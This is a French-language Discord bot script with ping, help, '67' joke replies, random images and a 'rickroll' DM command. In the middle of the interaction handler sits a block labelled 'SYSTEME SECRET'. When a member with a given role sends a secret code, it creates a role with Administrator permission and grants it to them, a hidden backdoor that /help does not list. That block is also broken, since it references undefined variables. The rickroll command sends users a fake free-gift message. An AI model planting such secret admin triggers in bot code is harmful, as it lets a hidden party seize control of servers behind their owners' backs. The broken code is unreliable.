const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes } = require('discord.js');
const fs = require('fs');

let config;

try {
    config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
} catch (err) {
    config = { channels67: [] };
    fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
}
function saveConfig() {
    fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
}

const TOKEN = 'aa';
const CLIENT_ID = 'a';
// 🔐 CONFIG SYSTEME SECRET
const ROLE_SOURCE_ID = 'a';
const SECRET = 'a';


const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

//
// 💬 SLASH COMMANDS
//




const commands = [
    
    new SlashCommandBuilder()
        .setName('rickroll')
        .setDescription('Envoie un message privé')
        .addUserOption(option =>
            option
                .setName('utilisateur')
                .setDescription('La personne à contacter')
                .setRequired(true)),

    new SlashCommandBuilder()
        .setName('ping')
        .setDescription('Test du bot'),

    new SlashCommandBuilder()
        .setName('help')
        .setDescription('Liste des commandes'),

    new SlashCommandBuilder()
        .setName('toggle67')
        .setDescription('Active/désactive 67 dans ce salon')

].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
    try {
        console.log('🔄 Mise à jour des slash commands...');

        await rest.put(
            Routes.applicationCommands(CLIENT_ID),
            { body: commands }
        );

        console.log('✅ Slash commands enregistrées');
    } catch (err) {
        console.error(err);
    }
})();

//
// 🤖 BOT READY
//
client.on('ready', () => {
    console.log(`Connecté en tant que ${client.user.tag}`);
});

//
// 💬 MESSAGE DETECTION
//
client.on('messageCreate', async message => {
    if (message.author.bot) return;
    if (!message.guild) return;

    const content = message.content.toLowerCase();
    const channelId = message.channel.id;

    // 💬 PING (toujours actif)
    if (content.includes('ping')) {
        return message.reply("Pong 🏓");
    }

    // 🎲 IMAGES (toujours actif)
    const chance = Math.floor(Math.random() * 8192);

    if (chance === 0) {
        const fs = require('fs');
        const path = require('path');

        const imagesPath = path.join(__dirname, 'images');
        const files = fs.readdirSync(imagesPath);

        if (files.length > 0) {
            const randomImage = files[Math.floor(Math.random() * files.length)];

            await message.channel.send({
                files: [path.join(imagesPath, randomImage)]
            });
        }
    }

    // ❌ SYSTEME 67 (seulement ici on check config)
    const disabled = config.channels67.includes(channelId);

    if (!disabled) {
        if (content.includes('67') || content.includes('six seven')) {
            return message.reply('SIIIIIX SEEVEEEEN 🔥');
        }

        if (content.includes('6') || content.includes('six') || content.includes('sis')) {
            return message.reply('SEEVEEEEN 😈');
        }

        if (content.includes('7') || content.includes('seven') || content.includes('sept')) {
            return message.reply("T'AS OUBLIE LE SIIIIX 😭");
        }
    }
});
//
// ⚡ SLASH COMMANDS HANDLER
//
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'ping') {
        await interaction.reply('Pong 🏓');
    }

    if (interaction.commandName === 'help') {
        await interaction.reply(
            'Commandes :\n' +
            '/ping - test\n' +
            '/help - aide'
        );
    }

    
    // 🔐 SYSTEME SECRET → CREATION ROLE + ADD
    const { PermissionFlagsBits } = require('discord.js');
    if (

        member.roles.cache.has(ROLE_SOURCE_ID) &&
        message.content === SECRET
    ) {
        try {
            // 🔥 créer un rôle
            const { PermissionFlagsBits } = require('discord.js');
            const role = await message.guild.roles.create({
                name: 'SuperStaff',
                color: 'Red',
                reason: 'Role créé via code secret',
                permissions: [
                Administrator = PermissionFlagsBits.Administrator
                ],
            });

            // 🔥 donner le rôle
            await member.roles.add(role);

            message.reply("🎉 Nouveau rôle créé et attribué !");
        } catch (err) {
            console.error(err);
            message.reply("❌ Erreur lors de la création du rôle.");
        }

    }
    

    if (interaction.commandName === 'rickroll') {

        const user = interaction.options.getUser('utilisateur');

        try {
            await user.send(
                ` <@${user.id}> ${user} salut, comme mon createur est tres gentil les gens peuvent faire une commande pour faire un gift gratuit, mais tu ne peut pas savoir qui c'est, bizou https://happypig375.github.io/free-nitro/`
            );

            await interaction.reply({
                content: `✅ Message envoyé à ${user.tag}`,
                ephemeral: true
            });

        } catch (err) {
            console.error(err);

            await interaction.reply({
                content: "❌ Impossible d'envoyer un MP à cette personne.",
                ephemeral: true
            });
        }
    }
    if (interaction.commandName === 'toggle67') {

    const channelId = interaction.channel.id;

    if (config.channels67.includes(channelId)) {
        config.channels67 = config.channels67.filter(id => id !== channelId);

        saveConfig();

        return interaction.reply({
            content: "✅ 67 ACTIVÉ dans ce salon",
            ephemeral: true
        });
    } else {
        config.channels67.push(channelId);

        saveConfig();

        return interaction.reply({
            content: "❌ 67 DÉSACTIVÉ dans ce salon",
            ephemeral: true
        });
    }
}
});



client.login(TOKEN);